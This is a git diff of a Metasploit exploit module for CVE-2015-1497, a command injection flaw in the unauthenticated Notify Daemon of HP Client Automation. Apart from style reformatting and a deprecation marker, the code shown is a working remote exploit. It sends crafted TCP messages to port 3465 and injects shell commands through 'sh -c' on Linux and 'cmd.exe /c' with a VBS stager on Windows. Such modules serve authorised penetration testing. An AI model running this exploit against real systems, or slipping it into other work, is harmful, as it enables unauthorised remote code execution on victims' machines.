@@ -8,69 +8,74 @@ class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::Remote::Tcp
   include Msf::Exploit::CmdStager
+  include Msf::Exploit::Deprecated
+  moved_from 'exploits/multi/misc/persistent_hpca_radexec_exec'
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'HP Client Automation Command Injection',
-      'Description'    => %q{
-        This module exploits a command injection vulnerability on HP Client Automation, distributed
-        actually as Persistent Systems Client Automation. The vulnerability exists in the Notify
-        Daemon (radexecd.exe), which doesn't authenticate execution requests by default.
+    super(
+      update_info(
+        info,
+        'Name' => 'HP Client Automation Command Injection',
+        'Description' => %q{
+          This module exploits a command injection vulnerability on HP Client Automation, distributed
+          actually as Persistent Systems Client Automation. The vulnerability exists in the Notify
+          Daemon (radexecd.exe), which doesn't authenticate execution requests by default.
 
-        This module has been tested successfully on HP Client Automation 9.00 on Windows 2003 SP2
-        and CentOS 5.
-      },
-      'Author'         =>
-        [
+          This module has been tested successfully on HP Client Automation 9.00 on Windows 2003 SP2
+          and CentOS 5.
+        },
+        'Author' => [
           'Ben Turner', # Vulnerability discovery
           'juan vazquez' # Metasploit module
         ],
-      'References'     =>
-        [
+        'References' => [
           ['CVE', '2015-1497'],
           ['ZDI', '15-038'],
           ['URL', 'https://radiasupport.accelerite.com/hc/en-us/articles/203659814-Accelerite-releases-solutions-and-best-practices-to-enhance-the-security-for-RBAC-and-Remote-Notify-features']
         ],
-      'Privileged'     => true,
-      'Platform'       => %w{ unix win },
-      'DefaultOptions' =>
-        {
-            'WfsDelay' => 10
+        'Privileged' => true,
+        'Platform' => %w[unix win],
+        'DefaultOptions' => {
+          'WfsDelay' => 10
         },
-      'Payload'        => {'DisableNops' => true},
-      'Targets'        =>
-        [
-          [ 'HP Client Automation 9.0.0 / Linux',
+        'Payload' => { 'DisableNops' => true },
+        'Targets' => [
+          [
+            'HP Client Automation 9.0.0 / Linux',
             {
               'Platform' => 'unix',
-              'Arch'     => ARCH_CMD,
-              'Payload'  =>
+              'Arch' => ARCH_CMD,
+              'Payload' =>
                 {
-                  'Space'       => 466,
+                  'Space' => 466,
                   'EncoderType' => Msf::Encoder::Type::CmdPosixPerl,
-                  'Compat'      =>
-                    {
-                      'PayloadType' => 'cmd',
-                      'RequiredCmd' => 'openssl telnet generic gawk'
-                    },
+                  'Compat' =>
+              {
+                'PayloadType' => 'cmd',
+                'RequiredCmd' => 'openssl telnet generic gawk'
+              },
                   'BadChars' => "\x27"
                 }
             }
           ],
-          [ 'HP Client Automation 9.0.0 / Windows',
+          [
+            'HP Client Automation 9.0.0 / Windows',
             {
               'Platform' => 'win',
-              'Arch'     => ARCH_X86
+              'Arch' => ARCH_X86
             }
           ]
         ],
-      'DefaultTarget'  => 0,
-      'DisclosureDate' => '2014-01-02'))
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2014-01-02'
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(3465)
-      ])
+      ]
+    )
 
     deregister_options('CMDSTAGER::FLAVOR')
     deregister_options('CMDSTAGER::DECODER')
@@ -79,8 +84,8 @@ class MetasploitModule < Msf::Exploit::Remote
   def check
     connect
     sock.put("\x00") # port
-    sock.put("#{rand_text_alphanumeric(4 + rand(3))}\x00") # user ID
-    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
+    sock.put("#{rand_text_alphanumeric(rand(4..6))}\x00") # user ID
+    sock.put("#{rand_text_alpha(rand(4..6))}\x00") # password
     sock.put("hide\x00") # command
     res = sock.get_once
     disconnect
@@ -96,7 +101,7 @@ class MetasploitModule < Msf::Exploit::Remote
     case target['Platform']
     when 'win'
       print_status('Exploiting Windows target...')
-      execute_cmdstager({:flavor => :vbs, :linemax => 290})
+      execute_cmdstager({ flavor: :vbs, linemax: 290 })
     when 'unix'
       print_status('Exploiting Linux target...')
       exploit_unix
@@ -109,8 +114,8 @@ class MetasploitModule < Msf::Exploit::Remote
     connect
     sock.put("\x00") # port
     sock.put("0\x00") # user ID
-    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
-    sock.put("hide hide\x09sh -c '#{payload.encoded.gsub(/\\/, "\\\\\\\\")}'\x00") # command, here commands can be injected
+    sock.put("#{rand_text_alpha(rand(4..6))}\x00") # password
+    sock.put("hide hide\x09sh -c '#{payload.encoded.gsub(/\\/, '\\\\\\\\')}'\x00") # command, here commands can be injected
     disconnect
   end
 
@@ -118,12 +123,12 @@ class MetasploitModule < Msf::Exploit::Remote
     connect
     sock.put("\x00") # port
     sock.put("S-1-5-18\x00") # user ID
-    sock.put("#{rand_text_alpha(4 + rand(3))}\x00") # password
+    sock.put("#{rand_text_alpha(rand(4..6))}\x00") # password
     sock.put("hide hide\"\x09\"cmd.exe /c #{cmd}&\"\x00") # command, here commands can be injected
     res = sock.get_once
     disconnect
     unless res && res.unpack('C')[0] == 0
-      fail_with(Failure::Unknown, "Something failed executing the stager...")
+      fail_with(Failure::Unknown, 'Something failed executing the stager...')
     end
   end
 end
